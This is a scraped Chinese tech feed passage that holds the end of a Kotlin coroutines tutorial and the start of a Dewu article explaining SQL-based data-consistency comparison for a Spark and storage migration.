.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>本期是协程的基础篇，会从协程作用域、上下文、启动模式等方面讲述如何去使用协程。并且，会基于协程提供的框架，封装工作中常用的基础能力。</p>
<h2 data-id="heading-1">二、协程作用域</h2>
<p>初学协程的时候，就听说过挂起函数必须在另一个挂起函数中或者协程作用域中才能被调用。那么，协程作用域是什么？如何创建一个协程作用域？</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    GlobalScope.launch { }
}

<span class="hljs-keyword">object</span> GlobalScope : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}
</code></pre>
<p>实现了 CoroutineScope 的类，创建该类的对象，就会得到一个协程作用域。</p>
<p>GlobalScope 是协程框架提供的一个全局作用域，由于它是静态的，因此它的生命周期一直持续到应用程序终止。在Android领域中，Google 提供一个一系列具有生命周期感知的 CoroutineScope。</p>
<ol>
<li>LifecycleScope：能监听页面的生命周期，在页面销毁的时候，取消协程</li>
<li>ViewModelScope：能够和 ViewModel 绑定，在 ViewModel 销毁的时候取消协程</li>
<li>MainScope：作用在主线程的协程作用域能够在这里进行 UI 的更新</li>
</ol>
<h2 data-id="heading-2">三、协程上下文</h2>
<p>协程上下文是一系列的实现了 Element 的集合，包括了 Job、CoroutineExceptionHandler、Dispatchers等。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CoroutineContext = Job() + CoroutineName(<span class="hljs-string">""</span>) + CoroutineExceptionHandler { coroutineContext, throwable -&gt; } + Dispatchers.IO
</code></pre>
<p>另外，协程上下文也是可以进行自定义的，只需要继承 Element 就可以了，示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserCoroutineContext</span>(<span class="hljs-keyword">val</span> id: String) : CoroutineContext.Element {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key = KEY

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> KEY : CoroutineContext.Key&lt;UserCoroutineContext&gt;
}
</code></pre>
<h2 data-id="heading-3">四、协程启动模式</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineStart</span> {
    DEFAULT,
    LAZY,
    <span class="hljs-meta">@ExperimentalCoroutinesApi</span> <span class="hljs-comment">// Since 1.0.0, no ETA on stability</span>
    ATOMIC,
    UNDISPATCHED;
}
</code></pre>
<p>我们通常用 <strong>DEFAULT</strong> 和 <strong>LAZY</strong> 的场景比较多，这四种启动模式的很好理解，解释如下：</p>
<ol>
<li>DEFAULT：默认的启动模式，协程创建完成之后就开始调度</li>
<li>LAZY：懒加载模式，例如 async 之后不直接启动，而是在 await 之后才开始调度</li>
<li>ATOMIC：启动之前不可取消</li>
<li>UNDISPATCHED：直接基于当前线程调用，直到遇到第一个挂起点，才会切换到 Dispatchers 指定的线程进行调度</li>
</ol>
<h2 data-id="heading-4">五、协程调度器</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">object</span> Dispatchers {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Default: CoroutineDispatcher = DefaultScheduler

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Main: MainCoroutineDispatcher <span class="hljs-keyword">get</span>() = MainDispatcherLoader.dispatcher

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Unconfined: CoroutineDispatcher = kotlinx.coroutines.Unconfined

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> IO: CoroutineDispatcher = DefaultIoScheduler
}
</code></pre>
<p>协程的调度方式分为 4 种，解释如下：</p>
<ol>
<li>Default：处理 CPU 密集型的任务</li>
<li>Main：主线程执行</li>
<li>Unconfined：不指定线程，直到遇到第一个挂起点，挂起恢复之后，切换到默认的线程</li>
<li>IO：IO 线程执行</li>
</ol>
<h2 data-id="heading-5">六、协程异常处理</h2>
<p>在一个协程作用域内，启动了多个协程，如果某个协程失败，那么其它的协程也会受到影响被取消，如下图实例：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c0b8eae961c420dbfbd3ba03bc17455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509581&amp;x-signature=j6j0eVG%2FdyAvDg5C%2FML0fcn8StM%3D" alt="image.png" loading="lazy"/></p>
<p>如果要让子协程之间不会相互影响，可以使用 <strong>SupervisorJob</strong>，示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        GlobalScope.launch {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob()) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"错误！！！！"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre>
<p>日志输出如下：</p>
<pre><code class="hljs language-swift" lang="swift">job1
job2
<span class="hljs-type">Exception</span> <span class="hljs-keyword">in</span> thread <span class="hljs-string">"DefaultDispatcher-worker-1"</span> java.lang.<span class="hljs-type">IllegalStateException</span>: 错误！！！！
	at com.xxxx.xxxx.xxxx.xxxxx.viewmodels.<span class="hljs-type">AKt</span><span class="hljs-variable">$main</span><span class="hljs-variable">$1</span><span class="hljs-variable">$1</span><span class="hljs-variable">$job1</span><span class="hljs-variable">$1</span>.invokeSuspend(<span class="hljs-type">A</span>.kt:<span class="hljs-number">42</span>)
</code></pre>
<p>job1 的失败不会影响 job2 的输出，但是应用程序依然会发生 Crash。SupervisorJob 能够阻止异常的传播，但是抛出的异常仍然需要被正确处理才行。示例如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        <span class="hljs-keyword">val</span> handle = CoroutineExceptionHandler { coroutineContext, throwable -&gt;
            println(throwable.message)
        }
        GlobalScope.launch(handle) {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob() ) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"错误！！！！"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Galaxy比数平台功能介绍及实现原理｜得物技术]]></title>    <link>https://juejin.cn/post/7597083949833928710</link>    <guid>https://juejin.cn/post/7597083949833928710</guid>    <pubDate>2026-01-20T06:17:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597083949833928710" data-draft-id="7596962772145356815" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Galaxy比数平台功能介绍及实现原理｜得物技术"/> <meta itemprop="keywords" content="大数据"/> <meta itemprop="datePublished" content="2026-01-20T06:17:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="得物技术"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Galaxy比数平台功能介绍及实现原理｜得物技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    得物技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T06:17:08.000Z" title="Tue Jan 20 2026 06:17:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、背景</h2>
<p>得物经过10年发展，计算任务已超10万+，数据已经超200+PB，为了降低成本，计算引擎和存储资源需要从云平台迁移到得物自建平台，计算引擎从云平台Spark迁移到自建Apache Spark集群、存储从ODPS迁移到OSS。</p>
<p>在迁移时，最关键的一点是需要保证迁移前后数据的一致性，同时为了更加高效地完成迁移工作（目前计算任务已超10万+，手动比数已是不可能），因此比数平台便应运而生。</p>
<h2 data-id="heading-1">二、数据比对关键挑战与目标</h2>
<h3 data-id="heading-2">关键挑战一：如何更快地完成全文数据比对</h3>
<p><strong>现状痛点：</strong></p>
<p>在前期迁移过程中，迁移同学需要手动join两张表来识别不一致数据，然后逐条、逐字段进行人工比对验证。这种方式在任务量较少时尚可应付，但当任务规模达到成千上万级别时，就无法实现并发快速分析。</p>
<p><strong>核心问题：</strong></p>
<ul>
<li>效率瓶颈：每天需要完成数千任务的比对，累计待迁移任务达10万+，涉及表数十万张。</li>
<li>扩展性不足：传统人工比对方式无法满足大规模并发处理需求。</li>
</ul>
<h3 data-id="heading-3">关键挑战二：如何精准定位异常数据</h3>
<p><strong>现状痛点：</strong></p>
<p>迁移同学在识别出不一致数据后，需要通过肉眼观察来定位具体问题，经常导致视觉疲劳和分析效率低下。</p>
<p><strong>核心问题：</strong></p>
<ul>
<li>分析困难：在比对不通过的情况下，比对人员需要人工分析失败原因。</li>
<li>复杂度高：面对数据量庞大、加工逻辑复杂的场景，特别是在处理大JSON数据时，肉眼根本无法有效分辨差异。</li>
<li>耗时严重：单次比对不通过场景的平均分析时间高达1.67小时/任务。</li>
</ul>
<h3 data-id="heading-4">比数核心目标</h3>
<p>基于以上挑战，数据比对系统需要实现以下核心目标：</p>
<ul>
<li>高并发处理能力：支持每天数千任务的快速比对，能够处理10万+待迁移任务和数十万张表的规模。</li>
<li>自动化比对机制：实现全自动化的数据比对流程，减少人工干预，提升比对效率。</li>
<li>智能差异定位：提供精准的差异定位能力，能够快速识别并高亮显示不一致的字段和数据。</li>
<li>可视化分析界面：构建友好的可视化分析平台，支持大JSON数据的结构化展示和差异高亮。</li>
<li>性能优化：将用户单次比对分析时间从小时级大幅缩短至分钟级别。</li>
<li>可扩展架构：设计可水平扩展的系统架构，能够随着业务增长灵活扩容。</li>
</ul>
<h2 data-id="heading-5">三、解决方案实现原理</h2>
<h3 data-id="heading-6">快速完成全文数据比对方法</h3>
<p><strong>比数方法调研</strong></p>
<p>待比对两表数据大小：300GB，计算资源：1000c</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ab7f4b85a76402cadb9d9b692aff2a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=LVX1Y6vhnRcW4tk8AHSxuRUULlw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4837101ae1a406b96ce9fb95e548487~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=s6edlU4%2Bdxp%2BvXIbVE%2FPBCibLdk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>经过调研分析比数平台采用第二种和第三种相结合的方式进行比数。</p>
<p><strong>先Union再分组数据一致性校验原理</strong></p>
<p>假如我们有如下a和b两表张需要进行数据比对</p>
<p>表a：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/186d08e493ea4efe82856cdbaa41bf13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=ppgJj3Yn9%2FpxI4r7dqU6vC6gbiI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>表b：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d69b9c1fc1904764b29d6f96304bbff8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=iwNUsObBCc3NpDlx7ePRL6porOs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>表行数比较：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>) <span class="hljs-keyword">from</span> a</span> ;
</code></pre>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params"><span class="hljs-number">1</span></span>) <span class="hljs-keyword">from</span> b</span> ;
</code></pre>
<p>针对上面的查询结果，如果数量不一致则退出比对，待修复后重新比数；数量一致则继续字段值比较。</p>
<p><strong>字段值比较：</strong></p>
<p>第一步：union a 和 b</p>
<pre><code class="hljs language-javascript" lang="javascript">select <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> a
union all
select <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> b
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08d2fbde55ed44e1b125872ceead1798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=bSne3rKYSuK0yGWAWlJv1q23w%2BY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>第二步：sum(_t1_count)，sum(_t2_count) 后分组</p>
<pre><code class="hljs language-javascript" lang="javascript">select <span class="hljs-title function_">sum</span>(_t1_count) <span class="hljs-keyword">as</span> sum_t1_count, <span class="hljs-title function_">sum</span>(_t2_count) <span class="hljs-keyword">as</span> sum_t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> (
select <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> a
union all
select <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> b
) <span class="hljs-keyword">as</span> union_table
group by <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f6723139f6f48bfbf61c35f72ffcd0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=%2FGc9N7JukWBR9eqalDFe5b94Gfw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>第三步：把不一致数据写入新的表中(即上面表中sum_t1_count和sum_t2_count不相等的数据)</p>
<pre><code class="hljs language-javascript" lang="javascript">drop table <span class="hljs-keyword">if</span> exists a_b_diff_20240908;
create table a_b_diff_20240908 <span class="hljs-keyword">as</span> select * <span class="hljs-keyword">from</span> (
select <span class="hljs-title function_">sum</span>(_t1_count) <span class="hljs-keyword">as</span> sum_t1_count, <span class="hljs-title function_">sum</span>(_t2_count) <span class="hljs-keyword">as</span> sum_t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> (
select <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> a
union all
select <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _t1_count, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> _t2_count, <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
<span class="hljs-keyword">from</span> b
) <span class="hljs-keyword">as</span> union_table
group by <span class="hljs-string">`id`</span>, <span class="hljs-string">`name`</span>, <span class="hljs-string">`age`</span>, <span class="hljs-string">`score`</span>
having <span class="hljs-title function_">sum</span>(_t1_count) &lt;&gt; <span class="hljs-title function_">sum</span>(_t2_count)
) <span class="hljs-keyword">as</span> tmp
</code></pre>
<p>如果a_b_diff_20240908没有数据则两张表没有差异，比数通过，如有差异如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb29da004d0457f8300a7fa6cc42c72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=j1fmuIbtemIRNe9y5Nnk5IQijx4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>第四步：读取不一致记录表，根据主键（比如id）找出不一致字段并写到结果表中。</p>
<p>第五步：针对不一致字段的数据进行根因分析，如 json 、数组顺序问题、浮点数精度问题等，给出不一致具体原因。</p>
<p><strong>哈希值聚合实现高效一致性校验</strong></p>
<p>针对上面union后sum 再 group by 方式 在数据量大的时候还是非常耗资源和时间的，考虑到比数任务毕竟有70%都是一致的，所以我们可以先采用哈希值聚合比较两表的的值是否一致，使用这种高效的方法先把两表数据一致的任务过滤掉，剩下的再采用上面方法继续比较，因为还要找出是哪个字段哪里不一致。原理如下：</p>
